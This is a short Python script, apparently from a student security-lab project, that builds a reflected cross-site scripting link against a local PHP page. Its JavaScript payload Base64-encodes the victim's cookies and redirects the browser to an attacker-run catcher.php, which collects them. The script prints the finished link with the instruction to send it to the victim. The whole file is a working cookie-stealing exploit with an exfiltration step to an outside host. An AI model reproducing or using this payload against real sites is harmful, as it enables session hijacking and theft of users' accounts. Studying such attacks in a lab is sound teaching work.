import urllib.parse

TARGET_IP = "192.168.56.1"
TARGET_URL = f"http://{TARGET_IP}/CyberProject/home.php"

# Attacker's address (where data will be sent)
# אולי לשנות לניצן או נעם כדי להראות מ2 מחשבים
ATTACKER_IP = "192.168.56.1"

# The Payload: stealing cookies and sending them to log.php
js_payload = f"<script>document.location='http://{ATTACKER_IP}/CyberProject/AttackerServer/catcher.php?data=' + btoa(document.cookie);</script>" # btoa - a function that encodes a string to Base64 to hide the cookies

encoded_payload = urllib.parse.quote(js_payload)
malicious_link = f"{TARGET_URL}?msg={encoded_payload}"

print("="*60)
print(f"[!] Network XSS Payload Generated (Target: {TARGET_IP})")
print("="*60)
print(f"\nSend this link to the victim:\n\n{malicious_link}")

# After running this script, enter http://192.168.56.1/CyberProject/home.php